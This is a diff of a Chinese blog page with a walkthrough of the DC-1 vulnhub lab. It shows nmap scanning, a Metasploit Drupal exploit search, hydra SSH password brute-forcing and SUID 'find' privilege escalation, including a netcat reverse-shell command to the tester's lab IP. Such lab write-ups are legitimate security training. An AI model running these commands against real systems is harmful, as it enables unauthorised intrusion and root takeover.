@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220413145938.jpg">
 <meta property="article:published_time" content="2022-04-12T03:15:53.000Z">
-<meta property="article:modified_time" content="2022-04-13T07:27:19.875Z">
+<meta property="article:modified_time" content="2022-04-13T08:46:56.451Z">
 <meta property="article:author" content="pepper">
 <meta property="article:tag" content="靶场练习">
 <meta name="twitter:card" content="summary_large_image">
@@ -249,17 +249,17 @@
 <p>对当前网段的主机进行扫描</p>
 <figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## 粗扫一遍，确认IP</span><br>nmap -sT -R 192.168.114.128/24<br><span class="hljs-comment">## 洗扫，确认详细指纹（这里用 -A 参数，可以更多的获取系统信息、组件版本信息、脚本扫描等）</span><br>nmap -A -sT4 目标ip<br></code></pre></div></td></tr></table></figure>
 
-<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/1649734628(1).jpg" srcset="/img/loading.gif" lazyload alt="img" style="zoom:67%;" />
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/1649734628(1).jpg" srcset="/img/loading.gif" lazyload alt="" style="zoom:67%;" />
 
 <p>目标主机<code>192.168.114.131</code>，存在开放端口<code>22、80、111</code>。</p>
 <ul>
 <li>http：drupal 7，暴露robots.txt</li>
 <li>ssh：先记着，后面有用</li>
 </ul>
-<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497341692359.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:67%;" />
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497341692359.png" srcset="/img/loading.gif" lazyload alt="" style="zoom:67%;" />
 
 <p>看了看网站的robots.txt，几个文件都没有什么有用的信息。</p>
-<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220412175948410.png" srcset="/img/loading.gif" lazyload alt="image-20220412175948410" style="zoom:67%;" />
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220412175948410.png" srcset="/img/loading.gif" lazyload alt="" style="zoom:67%;" />
 
 <hr>
 <h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h3><h4 id="5-1-msf-payload速查漏洞"><a href="#5-1-msf-payload速查漏洞" class="headerlink" title="5.1 msf-payload速查漏洞"></a>5.1 msf-payload速查漏洞</h4><p><strong>这里引出第一个常规思路：</strong> 在爆破、字典等常规操作无果后，如果已知网站的框架或组件，可以去搜索对应框架、组件的版本是否存在漏洞，这里去搜索drupal7漏洞，可以发现有很多可以尝试的，我们可以一一测试。当然在kali下，msf已经集成了常规框架的测试payload，非常的方便进行盲测。</p>
@@ -268,7 +268,7 @@
 </blockquote>
 <figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">msfconsole<br>msf6 &gt; search drupal<br></code></pre></div></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649741917775.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1649741917775.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里可以看到有非常多的模块可利用，简单粗暴的方式，从头到位撸一遍。然后发现上图中的第二个是能够反弹shell的。</p>
 <blockquote>
 <p>PS：其实最常规的做法是用扫描器扫一遍，然后根据扫描器提供的准确漏洞信息，再去msf中寻找利用模块。当然如果基于poc自行测试，那更好。</p>
@@ -326,15 +326,15 @@
 
 <hr>
 <h3 id="6-权限提升"><a href="#6-权限提升" class="headerlink" title="6.权限提升"></a>6.权限提升</h3><p>mysql重置完密码后，登录web后台随便翻翻，在Dashbord找到了第三个flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497500735014.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497500735014.png" srcset="/img/loading.gif" lazyload></p>
 <p>flag3给的提示，有几个关键词，<code>perms、find、passwd、-exec、shadow</code></p>
 <ul>
 <li><code>passwd和shadow</code>，想到去看看本地passwd文件，看没有什么线索。</li>
 <li><code>perms、find 和 -exec</code>，其实这里已经暗示了suid的find命令提权（和靶机Mr.robot对应上了）</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413113837457.png" srcset="/img/loading.gif" lazyload alt="image-20220413113837457"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413113837457.png" srcset="/img/loading.gif" lazyload></p>
 <p>那我们先看下&#x2F;etc&#x2F;passwd吧，发现存在flag4用户，家目录<code>/home/flag4</code>，进去得到了flag4，提示可以用同样的方式获得flag5。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413114742608.png" srcset="/img/loading.gif" lazyload alt="image-20220413114742608"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220413114742608.png" srcset="/img/loading.gif" lazyload></p>
 <p>但flag5是在root目录下的，我们一个普通用户是看不了滴，所以得想想怎么提权到root。</p>
 <h4 id="6-1-hydra爆破ssh密码"><a href="#6-1-hydra爆破ssh密码" class="headerlink" title="6.1 hydra爆破ssh密码"></a>6.1 hydra爆破ssh密码</h4><p>上面发现可以直接cd 到 flag4目录下并查看flag4.txt，所以并没有想到如何提权到flag4用户。之后看了其他的writeup，发现是可以通过爆破前面的22端口ssh获取到flag4的密码的，这里也简单学习下，多个思路。</p>
 <blockquote>
@@ -342,9 +342,9 @@
 </blockquote>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">hydra -u flag4 -P <span class="hljs-regexp">/home/</span>password.dic ssh:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">114.131</span> <br></code></pre></div></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564287279.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564287279.png" srcset="/img/loading.gif" lazyload></p>
 <p>后续ssh过去（不过倒是方便了之后进shell，不用非得在msf下维持了）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564834480.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497564834480.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
 <h4 id="6-2-SUID提权-find"><a href="#6-2-SUID提权-find" class="headerlink" title="6.2 SUID提权-find"></a>6.2 SUID提权-find</h4><p>回归正题，我们的目标是提权到root。根据前面的提示<code>perms、find、-exec</code>，可以很明显知道是要利用SUID提权了。这里如果对SUID提权不了解，可以看下之前总结的一篇博客，SUID提权（挖个坑）。</p>
 <blockquote>
@@ -352,13 +352,13 @@
 <p>如果Find命令是以suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
 <p>而使用find查找的时候，可以通过加入-exec 参数来执行测试表达式（理解为并列执行的意思），从而以root权限执行系统命令。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497510618652.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497510618652.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## -p是bash的参数，指的是如果uid和euid(或者说是suid)不一致的时候，如果不加-p，则euid会强制变成uid，从而无法反弹root的shell</span><br>find test_find -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br>find test_find -<span class="hljs-built_in">exec</span> /bin/bash -p \;<br>find test_find -<span class="hljs-built_in">exec</span> nc 192.168.114.128 5566 -e /bin/bash/ -p \;<br></code></pre></div></td></tr></table></figure>
 
 <p>有关find反弹shell和-p参数，可参考这篇：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/156795223?from_voters_page=true">为什么通过 find SUID 提权反弹的 shell 不是 root 权限？</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497547303366.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497547303366.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里成功得到root权限，按照flag4的提示，进入&#x2F;root&#x2F;下，得到最终flag，打完收工！</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497548807005.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16497548807005.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
 <h3 id="7-写在结尾"><a href="#7-写在结尾" class="headerlink" title="7.写在结尾"></a>7.写在结尾</h3><p><strong>对DC1学习内容做个复盘：</strong></p>
 <blockquote>
@@ -404,8 +404,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/03/29/vulhub-Mr.robot/">
-                        <span class="hidden-mobile">vulnhub-Mr.Robot</span>
+                      <a href="/2022/04/08/SUID%E6%8F%90%E6%9D%83/">
+                        <span class="hidden-mobile">SUID提权</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
